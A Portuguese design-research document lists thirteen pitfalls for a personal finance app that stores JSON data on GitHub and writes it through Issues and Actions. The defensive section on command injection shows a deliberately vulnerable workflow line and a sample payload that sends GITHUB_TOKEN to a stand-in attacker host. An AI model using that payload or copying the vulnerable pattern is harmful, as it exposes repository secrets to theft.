# Domain Pitfalls

**Domain:** Flat-file personal finance app (GitHub Pages + JSON in repo + Issue→Action write path)
**Researched:** 2026-04-08

---

## Critical Pitfalls

Erros que causam reescrita de componentes inteiros ou perda de dados.

---

### Pitfall 1: Race Condition — Escritas Concorrentes Destroem Dados

**O que dá errado:** Dois Issues criados em sequência rápida (ex.: usuário salva duas transações em <30s) disparam duas Actions simultâneas. Ambas fazem checkout do mesmo commit, modificam o mesmo JSON, e tentam push. O segundo push falha com "non-fast-forward" e **a segunda escrita é perdida silenciosamente** se não houver retry.

**Por que acontece:** GitHub Actions não serializa workflows por padrão. Cada run opera sobre um snapshot isolado do repo no momento do checkout.

**Consequências:** Perda de dados sem nenhum feedback ao usuário. A transação apareceu como "salva" (Issue criado com sucesso) mas nunca chegou ao JSON.

**Prevenção:**
1. Usar `concurrency` no workflow YAML para serializar execuções:
   ```yaml
   concurrency:
     group: data-write
     cancel-in-progress: false
   ```
   Isso cria uma fila — runs aguardam em vez de rodar em paralelo.
2. Como fallback, implementar retry com pull-before-push no script da Action.
3. No frontend, desabilitar o botão de salvar até receber confirmação (ou implementar debounce de pelo menos 5s).

**Sinais de alerta:** Issues com status "completed" mas dados ausentes no JSON. Dois workflow runs com timestamps muito próximos.

**Confiança:** HIGH — Documentação oficial do GitHub Actions confirma o problema e a solução via `concurrency`.

**Fase afetada:** Infraestrutura de escrita (fase de setup do pipeline Issue→Action→commit).

---

### Pitfall 2: Token de Autenticação Exposto no Frontend

**O que dá errado:** Para criar Issues via GitHub API a partir do browser, o frontend precisa de um Personal Access Token (PAT). Se esse token estiver no código JS (mesmo ofuscado), qualquer pessoa com acesso à URL pode extraí-lo e:
- Criar Issues maliciosos (injeção de dados)
- Ler repositórios privados (se o token tiver escopo amplo)
- Consumir os minutos de Actions do owner

**Por que acontece:** Não existe como esconder credenciais em código client-side estático. Minificação e build-time injection não são segurança — é ofuscação trivialmente reversível.

**Consequências:** Comprometimento do repositório. Em repos privados, exposição de dados financeiros pessoais. Consumo dos 2.000 minutos/mês de Actions por terceiros.

**Prevenção:**
1. **Token com escopo mínimo:** Usar Fine-Grained PAT restrito ao repositório específico, com permissão apenas `Issues: Read and write`. Nenhuma outra permissão.
2. **Repo privado com Pages habilitado:** Minimiza superfície — a URL não é indexada, mas não é secreto por si só.
3. **Rotação periódica:** Definir expiração de 90 dias no token e lembrete para renovar.
4. **Rate limiting no workflow:** A Action deve validar o payload do Issue antes de processar (rejeitar Issues que não seguem o schema esperado).
5. **Considerar alternativa:** Usar `workflow_dispatch` com token de escopo `Actions: Write` em vez de Issues. Porém, `workflow_dispatch` tem limite de 25 inputs — pode ser restritivo para payloads complexos.

**Sinais de alerta:** Issues criados por usuários desconhecidos. Pico inexplicável no consumo de Actions minutes. Token aparecendo em buscas no repositório (`git log -p --all -S 'ghp_'`).

**Confiança:** HIGH — Documentação oficial do GitHub explicita que tokens não devem ser expostos em código client-side.

**Fase afetada:** Fase de autenticação e segurança do pipeline de escrita. Deve ser definido ANTES de implementar o frontend.

---

### Pitfall 3: Injeção de Comandos via Issue Body/Title

**O que dá errado:** O corpo e título do Issue são input não-confiável (untrusted input). Se a Action usar esses valores diretamente em expressões `${{ }}` dentro de blocos `run:`, um atacante pode injetar comandos shell:

```yaml
# VULNERÁVEL — NÃO FAÇA ISSO
- run: echo "${{ github.event.issue.body }}"
```

Um Issue com body contendo `` `$(curl attacker.com/steal?token=$GITHUB_TOKEN)` `` executa código arbitrário com acesso aos secrets do repo.

**Por que acontece:** A sintaxe `${{ }}` do GitHub Actions faz substituição textual antes da execução do shell, sem sanitização.

**Consequências:** Roubo de secrets (incluindo `GITHUB_TOKEN` e qualquer secret configurado). Commits maliciosos no repositório. Comprometimento total do pipeline.

**Prevenção:**
1. **NUNCA** usar `${{ github.event.issue.body }}` ou `${{ github.event.issue.title }}` em blocos `run:`.
2. Passar via variáveis de ambiente:
   ```yaml
   - env:
       ISSUE_BODY: ${{ github.event.issue.body }}
     run: echo "$ISSUE_BODY"
   ```
3. Melhor ainda: o script da Action deve ler o Issue body via API (`gh issue view`) e fazer parse JSON do payload com `jq`, validando o schema antes de qualquer processamento.
4. Validar que o Issue foi criado pelo owner do repo (`github.event.issue.user.login == github.repository_owner`).

**Sinais de alerta:** Issues com caracteres suspeitos no body (backticks, `$(`, `&&`, pipes). Workflow runs com outputs inesperados.

**Confiança:** HIGH — GitHub Security Lab documenta extensamente esse vetor de ataque.

**Fase afetada:** Implementação do workflow da Action. Deve ser regra desde o primeiro workflow criado.

---

### Pitfall 4: Dados Stale — Cache do GitHub Pages e raw.githubusercontent

**O que dá errado:** Após uma escrita (Issue → Action → commit no JSON), o usuário recarrega a página e vê dados antigos:
- **GitHub Pages:** Cache CDN com `max-age=600` (10 minutos). O commit pode ter sido feito, mas o Pages ainda serve a versão anterior.
- **raw.githubusercontent.com:** Cache de ~5 minutos por IP. Fetch direto no raw content retorna dados stale.

O usuário pensa que a escrita falhou e tenta novamente → dados duplicados.

**Por que acontece:** GitHub Pages usa Fastly CDN com cache agressivo. Não há API para invalidar cache manualmente. O raw.githubusercontent.com tem cache próprio independente.

**Consequências:** UX terrível. Usuário não confia no app. Duplicação de transações. Necessidade de refresh múltiplos.

**Prevenção:**
1. **Optimistic UI obrigatório:** Após criar o Issue, atualizar o estado local (localStorage/sessionStorage) imediatamente com a transação, sem esperar confirmação do servidor.
2. **Cache local como source of truth para leituras recentes:** Mesclar dados locais (escritas pendentes) com dados do servidor (JSON via fetch). Dados locais têm prioridade por N minutos.
3. **Cache-busting nos fetches:** Adicionar `?t=${Date.now()}` nos requests ao JSON do Pages (não resolve 100% — CDN pode ignorar query strings — mas ajuda).
4. **Polling com backoff:** Após uma escrita, fazer polling no JSON a cada 15-30s por 5 minutos para detectar quando o commit apareceu. Ao detectar, limpar o cache local daquela escrita.
5. **Não usar raw.githubusercontent.com** — usar o URL do GitHub Pages (que já é o site estático servido).

**Sinais de alerta:** Usuário reporta "dados sumiram" após salvar. Transações aparecendo em duplicata.

**Confiança:** HIGH — Comportamento de cache documentado em discussions oficiais do GitHub e Stack Overflow.

**Fase afetada:** Arquitetura de leitura de dados e camada de estado do frontend. Deve ser projetado ANTES do CRUD.

---

## Moderate Pitfalls

---

### Pitfall 5: Crescimento do Repositório — Git History Bloat

**O que dá errado:** Cada escrita = 1 commit alterando um arquivo JSON. Com ~100 transações/mês, são ~100 commits/mês só de dados. Em 2 anos: ~2.400 commits com diffs de JSON. O repositório Git cresce porque **cada versão anterior de cada JSON fica no histórico** forever.

Limites do GitHub:
- Repo on-disk: recomendado até 10 GB
- Objeto individual: 100 MB hard limit
- Diretório: máx 3.000 entradas

**Por que acontece:** Git foi projetado para código-fonte (arquivos text com diffs incrementais pequenos), não para dados que crescem monotonicamente. JSON em particular diffa mal — mover uma vírgula muda metade das linhas.

**Prevenção:**
1. **Estruturar JSON para diffs limpos:** Uma transação por linha (JSON Lines / `.jsonl`) em vez de array formatado. Isso faz o diff do Git mostrar apenas a linha adicionada/removida.
2. **Particionar por mês/ano:** `data/transactions/2026-04.json` em vez de `data/transactions.json` monolítico. Arquivos menores = diffs menores = history menor.
3. **Commits com `--no-verify` e mensagens padronizadas:** Permite eventual squash se necessário.
4. **Monitorar tamanho:** Checar `git count-objects -vH` periodicamente. Se passar de 500 MB, considerar `git filter-branch` para remover history antigo de dados.
5. **Projetar para ~5 anos de uso:** Com particionamento mensal e ~150 transações/mês, cada arquivo mensal terá ~50 KB. Viável dentro dos limites.

**Sinais de alerta:** `git clone` demorando mais que 30s. Arquivo JSON individual passando de 1 MB. Diretório `/data` com mais de 500 arquivos.

**Confiança:** HIGH — Documentação oficial do GitHub lista os limites. Caso do Homebrew/Cargo/CocoaPods documenta o colapso de repos-como-database.

**Fase afetada:** Fase de modelagem de dados. A estrutura dos JSONs deve ser definida com particionamento desde o início.

---

### Pitfall 6: Latência de Escrita Sem Feedback Adequado

**O que dá errado:** O ciclo completo de uma escrita é:
1. Frontend cria Issue via API (~1-3s)
2. GitHub detecta o evento e agenda o workflow (~1-5s)
3. Action executa: checkout, parse, escrita, commit, push (~10-30s)
4. GitHub Pages rebuild + cache invalidation (~1-10 min)

**Total: 15 segundos a 10+ minutos** entre "cliquei salvar" e "posso ver o dado".

Se o frontend simplesmente mostra um spinner e espera a confirmação real, a UX é inaceitável para um app financeiro pessoal.

**Por que acontece:** Há 4 sistemas assíncronos em série, cada um com latência própria e sem garantia de tempo.

**Prevenção:**
1. **Feedback em 3 estágios:**
   - Instantâneo: "Transação registrada" (Issue criado com sucesso — o que o frontend pode confirmar)
   - Intermediário: ícone de sync indicando "processando" para itens pendentes
   - Final: ícone muda para "confirmado" quando polling detecta o dado no JSON
2. **Nunca bloquear a UI** esperando o ciclo completo.
3. **Queue local:** Armazenar escritas pendentes em localStorage. Se o app for fechado e reaberto antes da confirmação, mostrar as pendentes com status "sincronizando".
4. **Tratar o Issue como receipt:** Se o Issue foi criado com sucesso (HTTP 201), a escrita *vai* acontecer eventualmente. A Action é idempotente.

**Sinais de alerta:** Usuário clica "salvar" várias vezes. Reclamações de "app travou". Transações duplicadas.

**Confiança:** HIGH — Latência é característica inerente e documentada da arquitetura.

**Fase afetada:** UX do frontend e design do componente de formulário de transações. Fundamental desde o primeiro formulário de CRUD.

---

### Pitfall 7: Consumo de Actions Minutes em Repo Privado

**O que dá errado:** O plano gratuito do GitHub oferece 2.000 minutos/mês para repos privados. Cada escrita dispara uma Action. Se cada run levar ~30s:
- 100 transações/mês = ~50 minutos ✅
- 500 transações/mês = ~250 minutos ✅
- Mas: retries, falhas, Actions de build do Pages, Actions de CI, e qualquer outra automação **também contam**.

Se um bot ou token vazado criar Issues em loop, os minutos se esgotam em horas.

**Por que acontece:** Actions minutes são compartilhados entre TODOS os workflows do repositório. Não há como reservar minutes para um workflow específico.

**Prevenção:**
1. **Otimizar tempo de run:** Usar imagem leve (`ubuntu-latest`), evitar instalações desnecessárias. Scripts simples com Node.js/bash em vez de Docker custom.
2. **Rate limit no workflow:** Se mais de N Issues forem criados em M minutos pelo mesmo usuário, ignorar os excedentes.
3. **Monitorar consumo:** Checar `Settings → Billing → Actions` mensalmente.
4. **Considerar repo público:** Se os dados financeiros não forem sensíveis (ou se o app gerar dados de demonstração), repo público = Actions minutes ilimitados.
5. **Batching de escritas:** No frontend, acumular múltiplas transações e criar um único Issue com array de operações, em vez de 1 Issue por transação.

**Sinais de alerta:** Email do GitHub avisando sobre consumo de minutes. Actions falhando com "billing limit exceeded".

**Confiança:** HIGH — Limites documentados oficialmente pelo GitHub (2.000 min/mês free tier private repos).

**Fase afetada:** Design do pipeline de escrita e otimização do workflow YAML.

---

### Pitfall 8: Poluição do Tab de Issues

**O que dá errado:** Cada escrita cria um Issue. Com 100 transações/mês, em 1 ano são ~1.200 Issues no repositório. O tab "Issues" do GitHub fica inutilizável para uso legítimo (bugs, features, notas).

**Por que acontece:** Issues não foram projetados como fila de mensagens. Não há API para criar Issues "silenciosos" ou em namespace separado.

**Prevenção:**
1. **Fechar e rotular automaticamente:** A Action deve fechar o Issue após processar e adicionar label `data-write` + `processed`.
2. **Prefixo padronizado:** Título do Issue começa com `[DATA]` para filtrar facilmente.
3. **Cleanup periódico:** Action semanal/mensal que deleta Issues processados com mais de 30 dias (usar `gh issue delete` — requer permissão).
4. **Alternativa: `workflow_dispatch`** em vez de Issues para escritas simples. Não polui o tab de Issues, mas tem limite de 25 inputs e não fica visível como histórico.
5. **Alternativa: `repository_dispatch`** — evento custom que não cria nenhum artefato visível. Frontend faz `POST /repos/{owner}/{repo}/dispatches` com payload no body. Mais limpo que Issues.

**Sinais de alerta:** Issues tab com centenas de itens. Dificuldade em encontrar Issues reais entre os de dados.

**Confiança:** MEDIUM — Baseado em inferência lógica (100+ Issues/mês é uso atípico). GitHub não documenta limites específicos para volume de Issues.

**Fase afetada:** Design do mecanismo de trigger de escrita. Decisão entre Issues vs `repository_dispatch` vs `workflow_dispatch`.

---

### Pitfall 9: JSON Monolítico — Performance de Leitura no Frontend

**O que dá errado:** Se todas as transações ficarem em um único `transactions.json`, o frontend precisa fazer `fetch()` de todo o arquivo para qualquer operação — listar, filtrar, buscar, calcular totais. Com 3.000 transações (~500 KB de JSON):
- Parse no browser: ~50-200ms (aceitável)
- Download: depende da conexão, mas arquivo cresce indefinidamente

Mais grave: com 10.000+ transações (3+ anos de uso), o fetch + parse começa a impactar mobile.

**Por que acontece:** Flat-file não tem conceito de query, índice ou paginação server-side. Toda filtragem é client-side.

**Prevenção:**
1. **Particionar por período:** `data/transactions/2026-04.json` — frontend carrega apenas os meses necessários para a view atual.
2. **Arquivo de índice/sumário:** `data/summary.json` com totais por mês/categoria, atualizado pela Action a cada escrita. Dashboard carrega apenas o sumário (~2 KB) sem precisar das transações individuais.
3. **Lazy loading:** Ao abrir "Histórico", carregar mês atual primeiro, depois carregar meses anteriores on-demand conforme scroll.
4. **Limitar dados em memória:** Nunca carregar mais de 6-12 meses de transações na memória de uma vez.

**Sinais de alerta:** Tempo de carregamento inicial >3s. App travando em celulares mais antigos. Arquivo JSON >500 KB.

**Confiança:** HIGH — Limitação inerente de flat-file databases. Sem mitigação, é questão de tempo.

**Fase afetada:** Modelagem de dados e arquitetura de leitura. Deve ser decidido ANTES de implementar qualquer fetch.

---

## Minor Pitfalls

---

### Pitfall 10: Inconsistência entre Múltiplos JSONs

**O que dá errado:** Se a Action precisa atualizar `transactions.json` E `budget.json` E `summary.json` em uma única operação, e o script falha entre escritas, os arquivos ficam inconsistentes. Ex.: transação salva mas sumário não atualizado.

**Prevenção:**
1. Fazer todas as escritas em memória, depois fazer um único `git add . && git commit` com todos os arquivos alterados. O commit atômico garante tudo-ou-nada.
2. Implementar validação de consistência: Action de health-check periódica que recalcula sumários a partir das transações e corrige divergências.

**Confiança:** MEDIUM — Depende da implementação do script.

**Fase afetada:** Implementação do script da Action.

---

### Pitfall 11: Gemini API Key — Build-Time vs Runtime

**O que dá errado:** Se a key do Gemini for injetada no HTML durante o build (como env var substituída no template), ela ficará visível no código-fonte da página servida pelo Pages. Qualquer um que inspecione o HTML pode extraí-la.

Se for usada apenas no Action (server-side OCR), está segura nos GitHub Secrets. Mas se o OCR precisar ser client-side (upload de foto → Gemini direto do browser), a key precisa estar no frontend.

**Prevenção:**
1. **Preferir OCR via Action:** Usuário faz upload de imagem como attachment no Issue → Action lê a imagem, chama Gemini com key dos Secrets, extrai dados, salva no JSON. Key nunca toca o frontend.
2. Se OCR client-side for necessário: Gemini Free Tier tem rate limits generosos, mas a key exposta pode ser abusada. Monitorar consumo no Google Cloud Console.
3. **Definir na fase de design** se o OCR é server-side (Action) ou client-side.

**Confiança:** HIGH — Princípio fundamental de segurança (não expor secrets em client-side code).

**Fase afetada:** Fase de integração com Gemini AI.

---

### Pitfall 12: GitHub Pages Terms of Service

**O que dá errado:** GitHub Pages é destinado a "hosting personal, organization, or project sites" — não como CDN ou API endpoint genérico. Usar Pages puramente para servir JSON que um app consome via fetch está numa zona cinzenta dos ToS. GitHub pode throttle ou desabilitar o site.

**Prevenção:**
1. O app FinanceiroVK é genuinamente um site web pessoal hospedado no Pages (HTML/CSS/JS) que consome seus próprios dados. Isso é uso legítimo.
2. **Não expor os JSONs como API para terceiros.** Uso pessoal por 1-2 pessoas é trivial em termos de bandwidth.
3. Manter repo privado reduz visibilidade e probabilidade de problemas com ToS.
4. Se GitHub mudar os termos: a arquitetura é portável — os mesmos JSONs podem ser servidos de qualquer hosting estático (Netlify, Cloudflare Pages, etc.).

**Confiança:** MEDIUM — Uso pessoal de baixo tráfego provavelmente nunca será questionado, mas é bom estar ciente.

**Fase afetada:** Nenhuma fase específica — risco de plataforma de longo prazo.

---

### Pitfall 13: Workflow Failures Silenciosos

**O que dá errado:** Se a Action falhar (bug no script, API rate limit, erro de parse), o usuário não tem como saber. O Issue foi criado com sucesso (frontend recebeu HTTP 201), mas o dado nunca chegou ao JSON.

**Prevenção:**
1. **A Action deve comentar no Issue** com o resultado (sucesso ou erro). O frontend pode fazer polling no Issue para checar o status.
2. **Labels de status:** `processing`, `success`, `error`. Frontend monitora.
3. **Notificação por email:** GitHub já envia notificações de comentários em Issues por padrão — pode servir como alerta.
4. **Health check:** Endpoint simples (arquivo `data/status.json` atualizado a cada write com timestamp). Se o frontend detectar que o último write foi há mais de X minutos apesar de haver Issues pendentes, alertar o usuário.

**Confiança:** HIGH — Falhas em pipelines assíncronos sem feedback são um anti-pattern bem documentado.

**Fase afetada:** Implementação do workflow e da camada de feedback do frontend.

---

## Phase-Specific Warnings

| Fase / Tópico | Pitfall Provável | Mitigação |
|---|---|---|
| **Modelagem de dados** | JSON monolítico, diffs ruins no Git, sem particionamento (#5, #9) | JSON Lines ou particionamento mensal desde o dia 1 |
| **Pipeline de escrita (Action)** | Race condition (#1), injeção (#3), failures silenciosos (#13) | `concurrency` group, env vars para inputs, comentário no Issue |
| **Autenticação/segurança** | PAT exposto (#2), Gemini key exposta (#11) | Fine-grained PAT com escopo mínimo, OCR server-side |
| **Frontend — Estado** | Dados stale (#4), latência sem feedback (#6) | Optimistic UI + localStorage + polling |
| **Frontend — Performance** | JSON grande demais (#9) | Particionamento + lazy loading + arquivo de sumário |
| **Pipeline — Operações** | Actions minutes (#7), Issues poluídos (#8) | Batching, cleanup automático, considerar `repository_dispatch` |
| **Longo prazo** | Repo bloat (#5), ToS do Pages (#12) | Particionamento mensal, monitorar tamanho, arquitetura portável |

---

## Summary: Top 5 Decisões Que Previnem 80% dos Problemas

1. **`concurrency` group no workflow YAML** — elimina race conditions (#1)
2. **Optimistic UI com localStorage** — resolve stale data e latência (#4, #6)
3. **Particionamento mensal dos JSONs** — resolve bloat, performance e diffs (#5, #9)
4. **Inputs via env vars, NUNCA via `${{ }}`** — elimina injeção (#3)
5. **Fine-grained PAT com escopo mínimo** — limita dano de token exposto (#2)

---

## Sources

- [GitHub Actions Concurrency Control — Docs](https://docs.github.com/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs) — HIGH confidence
- [GitHub Actions Security: Untrusted Input — Security Lab](https://securitylab.github.com/resources/github-actions-untrusted-input/) — HIGH confidence
- [GitHub Repository Limits — Docs](https://docs.github.com/en/repositories/creating-and-managing-repositories/repository-limits) — HIGH confidence
- [GitHub Actions Billing — Docs](https://docs.github.com/billing/managing-billing-for-github-actions/about-billing-for-github-actions) — HIGH confidence
- [raw.githubusercontent.com Cache — Stack Overflow](https://stackoverflow.com/questions/64792450/avoiding-getting-cached-content-from-raw-githubusercontent-com) — MEDIUM confidence
- [GitHub Pages Cache Behavior — Stack Overflow](https://stackoverflow.com/questions/37072860/github-pages-are-not-refreshing) — MEDIUM confidence
- [Package Managers Using Git as Database — nesbitt.io](https://nesbitt.io/2025/12/24/package-managers-keep-using-git-as-a-database.html) — HIGH confidence (documenta colapsos reais do Cargo/Homebrew/CocoaPods)
- [Optimistic UI Patterns — simonhearne.com](https://simonhearne.com/2021/optimistic-ui-patterns/) — MEDIUM confidence
- [Eventual Consistency in UI — Medium](https://medium.com/@nusretasinanovic/eventual-consistency-in-the-ui-64b29e645e11) — MEDIUM confidence
